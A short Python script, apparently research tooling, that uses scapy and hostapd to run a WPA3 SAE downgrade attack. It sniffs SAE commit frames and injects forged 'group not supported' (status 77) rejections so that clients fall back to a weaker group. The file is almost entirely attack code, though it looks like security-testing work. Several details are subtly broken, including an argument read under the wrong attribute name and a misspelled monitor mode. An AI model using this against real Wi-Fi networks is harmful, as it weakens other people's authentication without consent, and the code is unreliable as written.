#!/usr/bin/env python3

from libwifi import *
import sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select
from scapy.all import *

apmac = None
hostapd = None


def get_macaddr(iface):
    mac = os.popen("ip -o link show | grep " + iface + " | cut -d ' ' -f 20").read().strip("\n")
    return mac

def set_up_hostapd(ssid, iface):
    global hostapd
    with open('hostapd_group.conf', 'w') as fp:
        fp.write("interface=" + iface + "\n" + "ssid=" + ssid + "\n" + 
		 "hw_mode=g\nchannel=1\nwpa_key_mgmt=SAE\nrsn_pairwise=CCMP\nauth_algs=3\nwpa_passphrase=XXXXXXXX\nwpa=2\nieee80211w=2")
    hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_group.conf", "-dd", "-K"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(1)

def configure_interface(iface):
    os.system("ifconfig " + iface + " down")
    os.system("iwconfig " + iface + " mode montior")
    os.system("ifconfig " + iface + " up")
    os.system("iw " + iface + " set channel 1")

def build_sae_commit_group_not_supported(srcaddr, dstaddr, group):
	p = Dot11(addr1=dstaddr, addr2=srcaddr, addr3=dstaddr)
	p = p/Dot11Auth(algo=3, seqnum=1, status=77)

	group_id = group
	return p/Raw(struct.pack("<H", group_id))
	
def get_sae_group(p):
	if not is_sae_commit(p): return None
	return raw(p[Dot11Auth].payload)[0]

def handle_traffic(p):
	if p.addr1 == apmac:
		if is_sae_commit(p):
			group = get_sae_group(p)
			print("Client is choosing group " + str(group) + ". Injecting commit frame rejecting the chosen group.")
			commit = build_sae_commit_group_not_supported(apmac, p.addr2, group)
			sendp(RadioTap()/commit, iface=args.interfaceInject)

def cleanup():
	if hostapd:
		print("cleaning up...")
		hostapd.terminate()
		hostapd.wait()


if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("ssid", help="SSID of the WPA3-AP")
	parser.add_argument("interface_AP", help="interface for the AP")
	parser.add_argument("interface_inject", help="interface to sniff and inject commit frames")
	atexit.register(cleanup)
	args = parser.parse_args()
	
	apmac = get_macaddr(args.interface_AP)
	configure_interface(args.interface_inject)
	set_up_hostapd(args.ssid, args.interface_AP)

	sniff(iface=args.interfaceInject, prn=handle_traffic)
